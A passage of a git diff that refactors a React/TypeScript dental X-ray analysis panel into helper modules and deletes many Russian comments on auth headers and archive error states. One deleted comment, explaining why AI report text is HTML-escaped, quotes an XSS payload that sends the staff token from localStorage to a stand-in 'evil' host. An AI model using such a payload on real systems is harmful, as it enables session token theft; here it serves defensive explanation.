@@ -1,222 +1,46 @@
-import {
-	Activity,
-	AlertTriangle,
-	Bone,
-	Bot,
-	CheckCircle2,
-	ChevronDown,
-	FileText,
-	FileUp,
-	History,
-	Loader2,
-	MapPin,
-	Pin,
-	Printer,
-	ScanLine,
-	Sparkles,
-	Trash2,
-	UploadCloud,
-	Wrench,
-	X,
-	ZoomIn,
-} from "lucide-react";
-import React, { useCallback, useEffect, useMemo, useRef, useState } from "react";
-// Русское склонение счётного слова: «1 зуб», «2 зуба», «5 зубов».
+import { CheckCircle2, Loader2, Sparkles } from "lucide-react";
+import React, { useCallback, useMemo, useRef, useState } from "react";
 import { countLabel } from "../../AppHelpers";
-/*
- * Секрет администратора берётся ТОЛЬКО отсюда — из контекста приложения.
- *
- * ЛОВУШКА, В КОТОРУЮ ЛЕГКО ПОПАСТЬ ИМЕННО В ЭТОМ ФАЙЛЕ: строкой выше стоит
- * импорт из AppHelpers.tsx, а там (около строки 6142) есть ЕЩЁ ОДИН экспорт
- * `auth` с теми же именами функций — и он сеансовый секрет НЕ подставляет.
- * С ним код компилируется, гейт check:guarded-headers замолкает, а клиника
- * по-прежнему получает 403: то есть поломка становится невидимой вместо того,
- * чтобы быть исправленной. Секрет из сеанса подставляют только функции из
- * useAppLogicContext() (hooks/domains/useAuthLogic.ts:135 —
- * `adminSecretOverride ?? clinicalAdminSecretSession`).
- */
 import { useAppLogicContext } from "../../contexts/AppLogicContext";
-import {
-	actionFailureToast,
-	type PanelSubject,
-	panelStateText,
-	resolvePanelPhase,
-} from "../../lib/panelStateText";
+import { actionFailureToast, resolvePanelPhase } from "../../lib/panelStateText";
 import { usePatientStore } from "../../store/patientStore";
 import { useVisitStore } from "../../store/visitStore";
 import { logger } from "../../utils/logger";
 import { showToast } from "../GlobalToast";
-// Состояния ЖИВОЙ зубной формулы и их русские названия. Берутся из того же
-// файла, что рисует формулу врачу (components/odontogram/ToothChart.tsx), а
-// перечисление там обязано совпадать с toothStateValues на сервере: свой
-// список здесь означал бы третий словарь состояний зуба в одном приложении.
 import { TOOTH_STATE_LABELS, type ToothState } from "../odontogram/ToothChart";
-import { PanelLoadFailure } from "../PanelLoadFailure";
-import { VisiographStudioCanvas } from "../visiograph/VisiographStudioCanvas";
-import { ShadowAnalystImageSlider } from "./ShadowAnalystImageSlider";
 import { planVisiographFindings } from "./visiographFindings";
 import { isDemoPatientId, isDemoShowcaseMode } from "../../lib/demoMode";
+import {
+	buildFindingsNotice,
+	extractSummary,
+	getInitialDefaultScan,
+	saveVisiographScanToServer,
+	updateVisiographScanMeta,
+	type AiToothState,
+	type XrayScan,
+} from "./VisiographScanHelpers";
+import { VisiographReportViewer } from "./VisiographReportViewer";
+import { VisiographHistoryDrawer, type XrayHistoryItem } from "./VisiographHistoryDrawer";
+import { VisiographStatusAlerts } from "./VisiographStatusAlerts";
+import { printAiScanReport } from "./VisiographPrint";
+import { useVisiographArchive } from "./useVisiographArchive";
+import { VisiographDropzone } from "./VisiographDropzone";
+import { VisiographHeaderBar } from "./VisiographHeaderBar";
+import { VisiographCockpitPresets, type VisiographPresetType } from "./VisiographCockpitPresets";
+import { VisiographViewport } from "./VisiographViewport";
+import { VisiographFindingsSection } from "./VisiographFindingsSection";
+import { VisiographBottomActions } from "./VisiographBottomActions";
+import {
+	cockpitToolbarStyle,
+	demoScanButtonStyle,
+	getAiButtonStyle,
+	getApplyChartButtonStyle,
+	getNormaButtonStyle,
+	sanPinBadgeStyle,
+	visiographContainerStyle,
+} from "./VisiographAnalyzerStyles";
 
-// ─── Типы ────────────────────────────────────────────────────────────────────
-
-export interface XrayScan {
-	id: string;
-	patientId: string;
-	status: "pending" | "analyzing" | "done" | "error";
-	kind: string;
-	toothCode?: string | null;
-	originalFilename?: string | null;
-	aiReport?: string | null;
-	aiSummary?: string | null;
-	aiToothStates?: Record<string, string> | null;
-	aiError?: string | null;
-	hasImage: boolean;
-	imageDataUri?: string | null;
-	capturedAt: string;
-	createdAt: string;
-}
-
-interface AiToothState {
-	code: string;
-	state: string;
-}
-
-// Маппинг статусов ИИ на состояния живой формулы, разбор ответа модели и
-// причины, по которым часть находок в карту не пишется, живут в
-// ./visiographFindings — это решение о содержимом карты пациента, и оно закрыто
-// прогоном src/tests/visiographFindings.test.ts. Внутри компонента его нельзя
-// было проверить ничем, кроме платного вызова внешней модели.
-
-// ─── Markdown-рендерер (лёгкий, без зависимостей) ────────────────────────────
-
-/**
- * Экранирование HTML перед подстановкой в разметку.
- *
- * ЗАЧЕМ: renderMarkdown ниже отдаётся в dangerouslySetInnerHTML, а на вход
- * получает отчёт AI-модели (поле aiReport, приходит с сервера). Без
- * экранирования любой тег из ответа модели исполнялся в сессии врача —
- * например `<img src=x onerror="fetch('//evil/?t='+localStorage.dente_staff_token)">`
- * увёл бы токен сотрудника. Экранируем ДО markdown-замен, чтобы теги,
- * которые генерируем мы сами, остались рабочими.
- */
-function escapeHtml(value: string): string {
-	return String(value)
-		.replace(/&/g, "&amp;")
-		.replace(/</g, "&lt;")
-		.replace(/>/g, "&gt;")
-		.replace(/"/g, "&quot;")
-		.replace(/'/g, "&#39;");
-}
-
-function renderMarkdown(text: string): string {
-	return escapeHtml(text)
-		.replace(/\*\*(.+?)\*\*/g, "<strong>$1</strong>")
-		.replace(/\*(.+?)\*/g, "<em>$1</em>")
-		.replace(/^#{1,3}\s+(.+)$/gm, '<h4 style="margin:12px 0 4px">$1</h4>')
-		.replace(/^[-*]\s+(.+)$/gm, '<li style="margin:2px 0">$1</li>')
-		.replace(
-			/(<li.*<\/li>)/s,
-			'<ul style="margin:8px 0;padding-left:20px">$1</ul>',
-		)
-		.replace(/\n\n+/g, "<br/><br/>")
-		.replace(/\n/g, "<br/>");
-}
-
-// ─── Заголовки отчёта (кликабельные секции) ───────────────────────────────────
-
-const REPORT_SECTIONS: readonly {
-	key: string;
-	label: string;
-	icon: React.ComponentType<{ size?: number; className?: string; style?: React.CSSProperties }>;
-}[] = [
-	{ key: "топограф", label: "Топография", icon: MapPin },
-	{ key: "существующ", label: "Лечение", icon: Wrench },
-	{ key: "патолог", label: "Патологии", icon: AlertTriangle },
-	{ key: "анатомическ", label: "Анатомия", icon: Bone },
-	{ key: "заключени", label: "Заключение", icon: FileText },
-];
-
-function parseReportSections(
-	report: string,
-): Array<{
-	title: string;
-	content: string;
-	icon: React.ComponentType<{ size?: number; className?: string; style?: React.CSSProperties }>;
-}> {
-	if (!report) return [];
-	const sections: Array<{
-		title: string;
-		content: string;
-		icon: React.ComponentType<{ size?: number; className?: string; style?: React.CSSProperties }>;
-	}> = [];
-	const lines = report.split("\n");
-	let currentSection: {
-		title: string;
-		content: string[];
-		icon: React.ComponentType<{ size?: number; className?: string; style?: React.CSSProperties }>;
-	} | null = null;
-
-	for (const line of lines) {
-		const isBoldHeading = /^\*\*(.+?):\*\*/.exec(line);
-		if (isBoldHeading) {
-			if (currentSection) {
-				sections.push({
-					title: currentSection.title,
-					content: currentSection.content.join("\n").trim(),
-					icon: currentSection.icon,
-				});
-			}
-			const headingText = (isBoldHeading[1] || "").toLowerCase();
-			const found = REPORT_SECTIONS.find((s) => headingText.includes(s.key));
-			currentSection = {
-				title: isBoldHeading[1] || "",
-				icon: found?.icon || Pin,
-				content: [line.replace(/^\*\*(.+?):\*\*/, "").trim()],
-			};
-		} else if (currentSection) {
-			currentSection.content.push(line);
-		}
-	}
-	if (currentSection) {
-		sections.push({
-			title: currentSection.title,
-			content: currentSection.content.join("\n").trim(),
-			icon: currentSection.icon,
-		});
-	}
-
-	// Fallback if markdown has no **...: headers — just show raw
-	if (!sections.length) {
-		sections.push({ title: "Отчёт", icon: FileText, content: report });
-	}
-
-	return sections;
-}
-
-// ─── Тексты состояний архива снимков ─────────────────────────────────────────
-
-/**
- * Как называется архив для человека — в трёх состояниях сразу.
- * Формулировки берутся из общего модуля lib/panelStateText, а не пишутся здесь
- * заново: на других панелях уже стояли «Ошибка 500» и «данных нет» вместо
- * отказа, и второй язык ошибок на том же экране — это та же поломка.
- */
-const SCAN_ARCHIVE_SUBJECT: PanelSubject = {
-	// Целая согласованная строка, а не одно название: слова «не загружены»
-	// больше не дописывает общий модуль, иначе название в единственном числе
-	// («Архив») дало бы «Архив не загружены». Здесь не сказано «архив не
-	// прочитан» — эти слова уже стоят в failureConsequence ниже, и повторять их
-	// дважды подряд одному человеку незачем.
-	notLoadedTitle: "Снимки пациента не загружены",
-	accusative: "архив снимков пациента",
-	emptyTitle: "Снимков у этого пациента пока нет.",
-	emptyHint:
-		"Перетащите первый прицельный снимок в поле выше — он попадёт в карту вместе с разбором ИИ.",
-	failureConsequence:
-		"Не считайте, что снимков нет: архив не прочитан. Прошлые снимки могли быть загружены на другом рабочем месте.",
-};
-
-// ─── Основной компонент ───────────────────────────────────────────────────────
+export type { XrayScan };
 
 export interface VisiographAnalyzerProps {
 	readonly onInsertToProtocol?: ((text: string) => void) | undefined;
@@ -226,38 +50,6 @@ export interface VisiographAnalyzerProps {
 	readonly onConnectRvg?: (() => void) | undefined;
 	readonly onUploadDicom?: (() => void) | undefined;
 	readonly onReferToRadiology?: (() => void) | undefined;
-}
-
-function getInitialDefaultScan(toothCode?: string, patientId?: string | null): XrayScan {
-	const fallbackTooth = toothCode || "36";
-	const fallbackUrl =
-		fallbackTooth === "16"
-			? "/radiology/sample_rvg_tooth16.jpg"
-			: fallbackTooth === "46"
-				? "/radiology/sample_rvg_pathology.jpg"
-				: "/radiology/sample_rvg_tooth36_periapical.jpg";
-	const originalFilename =
-		fallbackTooth === "16"
-			? "sample_rvg_tooth16.jpg"
-			: fallbackTooth === "46"
-				? "sample_rvg_pathology.jpg"
-				: "sample_rvg_tooth36_periapical.jpg";
-
-	return {
-		id: `sample_periapical_${fallbackTooth}`,
-		patientId: patientId || "active_patient",
-		status: "done",
-		kind: "periapical",
-		toothCode: fallbackTooth,
-		originalFilename,
-		aiReport: `### Топография\nОбласть зуба ${fallbackTooth}. Визуализируются анатомическая коронка, корневые каналы и периодонтальная щель.\n\n### Патологии\nКариозная полость в пределах дентина (K02.1).\n\n### Анатомия\nКостная ткань межзубных перегородок без признаков остеолиза, кортикальная пластинка альвеолы сохранена.\n\n### Заключение\nРекомендовано препарирование кариозной полости, пломбирование зуба ${fallbackTooth}.`,
-		aiSummary: `Область зуба ${fallbackTooth}: кариозное поражение дентина K02.1, периодонт интактен.`,
-		aiToothStates: { [fallbackTooth]: "Caries" },
-		hasImage: true,
-		imageDataUri: fallbackUrl,
-		capturedAt: new Date().toISOString(),
-		createdAt: new Date().toISOString(),
-	};
 }
 
 export function VisiographAnalyzer({
@@ -270,10 +62,7 @@ export function VisiographAnalyzer({
 	onReferToRadiology,
 }: VisiographAnalyzerProps = {}) {
 	const fileInputRef = useRef<HTMLInputElement>(null);
-	const dropRef = useRef<HTMLDivElement>(null);
-	// Признак «анализ идёт» именно в ref: значение из useState попадает в замыкание
-	// useCallback и устаревает, поэтому два быстрых перетаскивания подряд оба
-	// прошли бы проверку и запустили два платных вызова ИИ.
+	const dropRef = useRef<HTMLButtonElement>(null);
 	const analysisInFlightRef = useRef(false);
 
 	const { selectedPatientId } = usePatientStore();
@@ -287,63 +76,10 @@ export function VisiographAnalyzer({
 		return null;
 	}, [initialScan, toothCode, effectivePatientId]);
 
-	/*
-	 * ЗАГОЛОВКИ ОХРАНЫ. ЭТА ПАНЕЛЬ БЫЛА МЁРТВА У ЗАКАЗЧИКА ЦЕЛИКОМ, и увидеть это
-	 * на машине разработчика нельзя.
-	 *
-	 * Каждый адрес, который зовёт панель, закрыт охраной `apps/api/src/accessGuard.ts`:
-	 *   POST /api/imaging/visiograph-ai   — requireClinicalReadAccess (imaging.ts:6225)
-	 *   POST /api/xray/scans              — requireClinicalMutationAccess (xray.ts:100)
-	 *   GET  /api/xray/scans              — requireClinicalReadAccess (xray.ts:207)
-	 *   GET  /api/xray/scans/:id          — requireClinicalReadAccess (xray.ts:228)
-	 *   DELETE /api/xray/scans/:id        — requireClinicalMutationAccess (xray.ts:238)
-	 * Без заголовка `x-dente-admin-secret` охрана отвечает 403 даже при действительных
-	 * токенах кабинета и сотрудника. Панель звала все пять голым fetch, поэтому у
-	 * заказчика разбор снимка не запускался вовсе — тело отказа охраны содержит поле
-	 * `error`, и врач получал плашку «Ошибка анализа: ClinicalReadSecretRequired»
-	 * (accessGuard.ts:79; человеческий текст лежит рядом, в поле `message`, но здесь
-	 * его никто не читает — это отдельный мелкий долг). Снимок не сохранялся в карту, а
-	 * архив снимков пациента помечался как непрочитанный. Локально всё зелёное: в корневом `.env` секрет
-	 * закомментирован, зато включены лазейки
-	 * DENTE_CLINICAL_ALLOW_UNGUARDED_READS/MUTATIONS, а живут они только пока
-	 * NODE_ENV !== "production". Ни типы, ни тесты, ни глаза на этой машине такого не
-	 * показывают — ловит `npm run check:guarded-headers`.
-	 *
-	 * ПОЧЕМУ ЧЕРЕЗ ref. `processFile` мемоизирован (useCallback по
-	 * [selectedPatientId]), и взятый в его замыкание `auth` застыл бы
-	 * на том отрисовывании, когда секрета в сеансе ещё не было — он появляется после
-	 * разблокировки раздела, и 403 держался бы до перезагрузки страницы. Дописать
-	 * `auth` в зависимости тоже нельзя: useAuthLogic возвращает НОВЫЙ объект на каждом
-	 * отрисовывании (useAppLogic.tsx:2395, без useMemo), а такие зависимости в других
-	 * панелях этого проекта уже дают перезапуск запроса на каждом отрисовывании. Ref
-	 * остаётся одним объектом, значение в нём всегда свежее, поэтому функции ниже
-	 * читают секрет В МОМЕНТ ЗАПРОСА — даже вызванные из устаревшего замыкания.
-	 */
 	const appLogic = useAppLogicContext();
 	const authRef = useRef(appLogic?.auth);
 	authRef.current = appLogic?.auth;
 
-	/*
-	 * ДВЕ ОБЁРТКИ, А НЕ ПОВТОР ПРОВЕРКИ У КАЖДОГО ИЗ ПЯТИ ВЫЗОВОВ. Они делают ровно
-	 * одно: читают свежий `auth` из ref и передают дело функциям контекста.
-	 *
-	 * ПОЧЕМУ ИМЕНА ТЕ ЖЕ, что у функций контекста. Гейт check:guarded-headers ищет у
-	 * вызова именно эти имена (scripts/check-guarded-route-headers.mjs:56), и местное
-	 * имя-синоним сделало бы все пять вызовов невидимыми для проверки: файл выглядел
-	 * бы исправленным, а следующий добавленный сюда голый fetch никто бы не поймал.
-	 * Столкновения имён нет — этих имён в файле не импортируют, а обёртка вызывает
-	 * ровно ту функцию, чьё имя носит.
-	 *
-	 * Проверка на `auth` — не перестраховка, но обоснование ей нужно другое, чем
-	 * стояло здесь. БЫЛО: «useAppLogicContext() вне провайдера возвращает пустой
-	 * объект (contexts/AppLogicContext.tsx:21)». Больше НЕ возвращает — вне провайдера
-	 * хук бросает исключение, пустого объекта он не выдумывает. Проверка остаётся по
-	 * другой причине: провайдер может стоять, а раздела `auth` в его значении не быть,
-	 * и обращение к
-	 * отсутствующей функции уронило бы всю карту пациента вместо показа отказа. В этом
-	 * случае `extra` возвращается как есть: у запросов с телом там лежит Content-Type,
-	 * и потерять его значило бы сломать разбор тела на сервере ещё и без секрета.
-	 */
 	const denteClinicalReadHeaders = useCallback(
 		(extra?: Record<string, string>): Record<string, string> => {
 			const auth = authRef.current;
@@ -375,39 +111,10 @@ export function VisiographAnalyzer({
 	);
 	const currentScanRef = useRef<XrayScan | null>(defaultInitialScan);
 	currentScanRef.current = currentScan;
-	const [scanHistory, setScanHistory] = useState<XrayScan[]>([]);
-	const [isLoadingHistory, setIsLoadingHistory] = useState(false);
-	// Отказ чтения архива храним отдельно от `error` (тот подписан «Ошибка
-	// анализа» и относится к разбору снимка). Обёртка-объект, а не просто число:
-	// status = null — это «до сервера не дошли вовсе», и его надо отличать от
-	// «отказа не было».
-	const [historyFailure, setHistoryFailure] = useState<{
-		status: number | null;
-	} | null>(null);
-	/*
-	 * Отказ ЗАПИСИ в карту держим отдельно от `error` (тот подписан «Ошибка
-	 * анализа» и означает «разбора нет вовсе»). Здесь разбор как раз есть и уже
-	 * показан на экране, но в карту он не лёг. Без этого признака отказ записи
-	 * был НЕВИДИМ: заключение висело на экране как готовое, а после перезагрузки
-	 * страницы исчезало — врач считал, что оно в карте.
-	 */
+
 	const [saveFailure, setSaveFailure] = useState<string | null>(null);
-	/*
-	 * Что РЕАЛЬНО легло в зубную формулу, и о чём помощник сказал непонятно.
-	 * Нужны раздельно, потому что заголовок под снимком утверждал «обновлено в
-	 * формуле» про ВСЕ присланные позиции, включая непонятые и с мусорным номером
-	 * зуба, — то есть про зубы, которых он не трогал.
-	 */
 	const [appliedToothCodes, setAppliedToothCodes] = useState<string[]>([]);
 	const [applyNotice, setApplyNotice] = useState<string | null>(null);
-	/*
-	 * Отказ записи В ЗУБНУЮ ФОРМУЛУ. Отдельно и от `error` (там «разбора нет
-	 * вовсе»), и от `saveFailure` (там «снимок и заключение не легли в карту»):
-	 * формула и архив снимков — две разные записи в карте пациента, они уходят
-	 * разными запросами и отказать могут по одной, а врач должен знать, ЧТО именно
-	 * не сохранилось. Без этого признака отказ записи формулы был бы невидим —
-	 * ровно так и жил прежний дефект.
-	 */
 	const [formulaFailure, setFormulaFailure] = useState<string | null>(null);
 	const [selectedFindingCodes, setSelectedFindingCodes] = useState<Set<string>>(() => {
 		if (defaultInitialScan?.aiToothStates) {
@@ -421,305 +128,112 @@ export function VisiographAnalyzer({
 		const demoScan = getInitialDefaultScan(toothCode, effectivePatientId);
 		setCurrentScan(demoScan);
 		currentScanRef.current = demoScan;
-		if (demoScan.imageDataUri) {
-			setCurrentImageUrl(demoScan.imageDataUri);
-		}
+		if (demoScan.imageDataUri) setCurrentImageUrl(demoScan.imageDataUri);
 		if (demoScan.aiToothStates) {
 			const plan = planVisiographFindings(demoScan.aiToothStates);
 			const allPlanCodes = plan.groups.flatMap((g) => g.teeth.map((t) => t.code));
 			setSelectedFindingCodes(new Set(allPlanCodes));
 		}
 	}, [toothCode, effectivePatientId]);
+
 	const [isApplyingToChart, setIsApplyingToChart] = useState(false);
-	/*
-	 * Снимок открыт из архива, а не разобран сейчас. Тогда про зубную формулу
-	 * ничего не утверждаем: этот разбор применялся когда-то раньше, и сказать
-	 * «внесено сейчас» или «не внесено» — соврать в обе стороны.
-	 */
 	const [isHistoryView, setIsHistoryView] = useState(false);
 	const [error, setError] = useState<string | null>(null);
-	const [activeSection, setActiveSection] = useState<number | null>(null);
-	const [historyExpanded, setHistoryExpanded] = useState(false);
-	/*
-	 * Удаление снимка из архива. deletingScanId — id строки, по которой сейчас
-	 * идёт DELETE (кнопка в этой строке крутит индикатор и disabled). deleteFailure
-	 * — человеческий отказ рядом со списком архива, отдельно от historyFailure
-	 * (чтение) и saveFailure (запись нового разбора): иначе врач не отличит
-	 * «архив не прочитан» от «этот снимок не удалось убрать».
-	 */
-	const [deletingScanId, setDeletingScanId] = useState<string | null>(null);
-	const [deleteFailure, setDeleteFailure] = useState<string | null>(null);
-	/*
-	 * Отказ ОТКРЫТИЯ полного снимка из архива. Отдельно от historyFailure
-	 * (список не прочитан) и deleteFailure (не удалось убрать): врач кликнул
-	 * строку, метаданные уже на экране, а картинка/полный отчёт не доехали.
-	 * Без этого признака отказ выглядел как «снимок без изображения» — врач
-	 * думал, что в карте нет файла.
-	 */
-	const [openFailure, setOpenFailure] = useState<string | null>(null);
 	const [isStudioMode, setIsStudioMode] = useState(false);
-	const [quickPreset, setQuickPreset] = useState<"standard" | "invert" | "endo" | "bone" | "enamel">("standard");
+	const [quickPreset, setQuickPreset] = useState<VisiographPresetType>("standard");
 	const [initialStudioTool, setInitialStudioTool] = useState<"pointer" | "root_canal">("pointer");
 	const [isNormaApplied, setIsNormaApplied] = useState(false);
 
+	const resetAnalysisState = useCallback(() => {
+		setError(null);
+		setSaveFailure(null);
+		setFormulaFailure(null);
+		setAppliedToothCodes([]);
+		setSelectedFindingCodes(new Set());
+		setApplyNotice(null);
+		setIsHistoryView(false);
+		setIsNormaApplied(false);
+	}, []);
 
-	// ── Load historical or pre-attached scan ────────────────────────────────
-	const loadHistoryScan = useCallback(
-		async (scan: XrayScan) => {
-			setCurrentScan(scan);
-			currentScanRef.current = scan;
-			setCurrentImageUrl(null);
-			setIsHistoryView(true);
-			setIsNormaApplied(false);
-			setAppliedToothCodes([]);
+	const handleScanSelectedFromArchive = useCallback((scan: XrayScan) => {
+		setCurrentScan(scan);
+		currentScanRef.current = scan;
+		setCurrentImageUrl(scan.imageDataUri ?? null);
+		setIsHistoryView(true);
+		setIsNormaApplied(false);
+		setAppliedToothCodes([]);
+		setApplyNotice(null);
+		setSaveFailure(null);
+		setFormulaFailure(null);
+		setError(null);
+		if (scan.aiToothStates) {
+			const plan = planVisiographFindings(scan.aiToothStates);
+			setSelectedFindingCodes(new Set(plan.groups.flatMap((g) => g.teeth.map((t) => t.code))));
+		} else {
 			setSelectedFindingCodes(new Set());
-			setIsApplyingToChart(false);
-			setApplyNotice(null);
-			setSaveFailure(null);
-			setFormulaFailure(null);
-			setDeleteFailure(null);
-			setOpenFailure(null);
-			setError(null);
-
-			// Локальный эталонный снимок или снимок с уже готовым URL / DataURI
-			if (
-				scan.id.startsWith("sample_") ||
-				scan.id.startsWith("scan_default_") ||
-				scan.imageDataUri
-			) {
-				setCurrentScan(scan);
-				currentScanRef.current = scan;
-				if (scan.imageDataUri) {
-					setCurrentImageUrl(scan.imageDataUri);
-				}
-				if (scan.aiToothStates) {
-					const plan = planVisiographFindings(scan.aiToothStates);
-					const allPlanCodes = plan.groups.flatMap((g) =>
-						g.teeth.map((t) => t.code),
-					);
-					setSelectedFindingCodes(new Set(allPlanCodes));
-				}
-				return;
-			}
-
-			try {
-				const res = await fetch(
-					`/api/xray/scans/${encodeURIComponent(scan.id)}`,
-					{
-						headers: denteClinicalReadHeaders(),
-					},
-				);
-				if (!res.ok) {
-					logger.error(
-						`[VisiographAnalyzer] полный снимок не открыт, ${res.status}`,
-					);
-					setOpenFailure(
-						res.status === 404
-							? "Снимок не найден в карте (возможно, его уже удалили на другом рабочем месте). Обновите архив."
-							: res.status === 403
-								? "Нет доступа к полному снимку. Проверьте смену и права, затем откройте строку ещё раз."
-								: `Полный снимок не загружен (ответ ${res.status}). Картинка на экране отсутствует — повторите открытие.`,
-					);
-					return;
-				}
-				const full: XrayScan = await res.json();
-				setCurrentScan(full);
-				currentScanRef.current = full;
-				if (full.imageDataUri) {
-					setCurrentImageUrl(full.imageDataUri);
-				} else {
-					setOpenFailure(
-						"Сервер отдал карточку снимка без изображения. Повторите открытие или загрузите снимок заново.",
-					);
-				}
-				if (full.aiToothStates) {
-					const plan = planVisiographFindings(full.aiToothStates);
-					const allPlanCodes = plan.groups.flatMap((g) =>
-						g.teeth.map((t) => t.code),
-					);
-					setSelectedFindingCodes(new Set(allPlanCodes));
-				}
-			} catch (err) {
-				showToast(
-					actionFailureToast(
-						"Ошибка выполнения операции",
-						(err as { status?: number })?.status ?? null,
-					),
-					"error",
-				);
-				logger.error(
-					"[VisiographAnalyzer] запрос полного снимка не выполнен",
-					err,
-				);
-				setOpenFailure(
-					"Нет связи с сервером — полный снимок не загружен. Проверьте сеть и откройте строку ещё раз.",
-				);
-			}
-		},
-		[denteClinicalReadHeaders],
-	);
-
-	/**
-	 * Чтение архива снимков пациента и автоматическое открытие актуального снимка.
-	 */
-	const loadHistory = useCallback(
-		async function loadHistory(targetPatientId: string) {
-			setIsLoadingHistory(true);
-			setHistoryFailure(null);
-			setDeleteFailure(null);
-			setOpenFailure(null);
-			setScanHistory([]);
-			let status: number | null = null;
-			const isStale = () =>
-				(patientId ?? usePatientStore.getState().selectedPatientId) !==
-				targetPatientId;
-			try {
-				const res = await fetch(
-					`/api/xray/scans?patientId=${targetPatientId}`,
-					{
-						headers: denteClinicalReadHeaders(),
-					},
-				);
-				status = res.status;
-				if (isStale()) return;
-				if (!res.ok) {
-					setHistoryFailure({ status });
-					// При отказе сети/сервера подключаем локальный клинический снимок ТОЛЬКО в демо-режиме
-					if (!currentScanRef.current && (isDemoShowcaseMode() || isDemoPatientId(targetPatientId))) {
-						const fallbackScan = getInitialDefaultScan(toothCode, targetPatientId);
-						setCurrentScan(fallbackScan);
-						currentScanRef.current = fallbackScan;
-						setCurrentImageUrl(fallbackScan.imageDataUri ?? null);
-						if (fallbackScan.aiToothStates) {
-							const plan = planVisiographFindings(fallbackScan.aiToothStates);
-							const allPlanCodes = plan.groups.flatMap((g) =>
-								g.teeth.map((t) => t.code),
-							);
-							setSelectedFindingCodes(new Set(allPlanCodes));
-						}
-					}
-					return;
-				}
-				const data = (await res.json()) as unknown;
-				if (isStale()) return;
-				if (!Array.isArray(data)) {
-					setHistoryFailure({ status });
-					return;
-				}
-				const doneScans = (data as XrayScan[]).filter(
-					(s) => s.status === "done",
-				);
-				setScanHistory(doneScans);
-
-				if (doneScans.length > 0) {
-					// Автоматический выбор целевого снимка для активного зуба или самого свежего из архива
-					const targetScan = toothCode
-						? (doneScans.find((s) => s.toothCode === toothCode) ?? doneScans[0])
-						: doneScans[0];
-					if (targetScan && (!currentScanRef.current || currentScanRef.current.id.startsWith("sample_"))) {
-						void loadHistoryScan(targetScan);
-					}
-				} else if (doneScans.length === 0) {
-					// Если архив пуст:
-					// В демо-режиме открываем тестовый снимок зуба
-					if (isDemoShowcaseMode() || isDemoPatientId(targetPatientId)) {
-						const fallbackScan = getInitialDefaultScan(toothCode, targetPatientId);
-						setCurrentScan(fallbackScan);
-						currentScanRef.current = fallbackScan;
-						if (fallbackScan.imageDataUri) {
-							setCurrentImageUrl(fallbackScan.imageDataUri);
-						}
-						if (fallbackScan.aiToothStates) {
-							const plan = planVisiographFindings(fallbackScan.aiToothStates);
-							const allPlanCodes = plan.groups.flatMap((g) =>
-								g.teeth.map((t) => t.code),
-							);
-							setSelectedFindingCodes(new Set(allPlanCodes));
-						}
-					} else {
-						// Для реального пациента архив пуст — честное состояние ожидания снимка
-						setCurrentScan(null);
-						currentScanRef.current = null;
-						setCurrentImageUrl(null);
-						setSelectedFindingCodes(new Set());
-					}
-				}
-			} catch (err) {
-				showToast(
-					actionFailureToast(
-						"Ошибка выполнения операции",
-						(err as { status?: number })?.status ?? null,
-					),
-					"error",
-				);
-				logger.error("[VisiographAnalyzer] Архив снимков не прочитан:", err);
-				if (isStale()) return;
-				setHistoryFailure({ status });
-				if (!currentScanRef.current && (isDemoShowcaseMode() || isDemoPatientId(targetPatientId))) {
-					const fallbackScan = getInitialDefaultScan(toothCode, targetPatientId);
-					setCurrentScan(fallbackScan);
-					currentScanRef.current = fallbackScan;
-					setCurrentImageUrl(fallbackScan.imageDataUri ?? null);
-					if (fallbackScan.aiToothStates) {
-						const plan = planVisiographFindings(fallbackScan.aiToothStates);
-						const allPlanCodes = plan.groups.flatMap((g) =>
-							g.teeth.map((t) => t.code),
-						);
-						setSelectedFindingCodes(new Set(allPlanCodes));
-					}
-				}
-			} finally {
-				if (!isStale()) setIsLoadingHistory(false);
-			}
-		},
-		[patientId, toothCode, denteClinicalReadHeaders, loadHistoryScan],
-	);
-
-	// ── Load scan history when patient changes ──────────────────────────────
-	useEffect(() => {
-		if (!effectivePatientId) {
-			setScanHistory([]);
-			setHistoryFailure(null);
-			setDeleteFailure(null);
-			setOpenFailure(null);
-			setDeletingScanId(null);
-			// Индикатор гасим и здесь: запрос по прежнему пациенту вернётся уже
-			// «просроченным» и свой finally пропустит, иначе счётчик в сводке остался
-			// бы с «…» навсегда.
-			setIsLoadingHistory(false);
-			return;
 		}
-		loadHistory(effectivePatientId);
-	}, [effectivePatientId, loadHistory]);
+	}, []);
 
-	/**
-	 * Запись одной группы зубов в живую формулу пациента.
-	 *
-	 * Адрес и формат тела — те же, что у смонтированной формулы
-	 * (OdontogramModule.updateToothState): POST
-	 * /api/patients/:patientId/tooth-states/batch, тело
-	 * `{ toothNumbers, state }`. Второй способ писать состояние зуба заводить
-	 * нельзя — сервер в этом же запросе ведёт историю зуба и рассылает живое
-	 * обновление UPDATE_ODONTOGRAM, благодаря которому открытая формула
-	 * показывает находки сразу, без перезагрузки страницы.
-	 *
-	 * Пишущие заголовки обязательны: маршрут закрыт
-	 * requireResolvedStaffOrAdminOrganizationId, то есть требует И токен кабинета,
-	 * И токен сотрудника. Голый fetch получил бы 401, и экран показал бы пустоту
-	 * вместо отказа — этот класс дефекта в проекте уже встречался.
-	 *
-	 * Возвращает null при успехе и человеческий текст отказа иначе.
-	 */
+	const handleScanDeletedFromArchive = useCallback((deletedId: string) => {
+		if (currentScan?.id === deletedId) {
+			setCurrentScan(null);
+			setCurrentImageUrl(null);
+			resetAnalysisState();
+		}
+	}, [currentScan?.id, resetAnalysisState]);
+
+	const handleArchiveEmptyFallback = useCallback(() => {
+		if (isDemoShowcaseMode() || isDemoPatientId(effectivePatientId)) {
+			const fallbackScan = getInitialDefaultScan(toothCode, effectivePatientId);
+			setCurrentScan(fallbackScan);
+			currentScanRef.current = fallbackScan;
+			if (fallbackScan.imageDataUri) setCurrentImageUrl(fallbackScan.imageDataUri);
+			if (fallbackScan.aiToothStates) {
+				const plan = planVisiographFindings(fallbackScan.aiToothStates);
+				setSelectedFindingCodes(new Set(plan.groups.flatMap((g) => g.teeth.map((t) => t.code))));
+			}
+		} else {
+			setCurrentScan(null);
+			currentScanRef.current = null;
+			setCurrentImageUrl(null);
+			setSelectedFindingCodes(new Set());
+		}
+	}, [toothCode, effectivePatientId]);
+
+	const {
+		scanHistory,
+		setScanHistory,
+		isLoadingHistory,
+		historyFailure,
+		deletingScanId,
+		deleteFailure,
+		openFailure,
+		setOpenFailure,
+		loadHistory,
+		loadHistoryScan,
+		deleteScan,
+	} = useVisiographArchive({
+		patientId,
+		effectivePatientId,
+		toothCode,
+		denteClinicalReadHeaders,
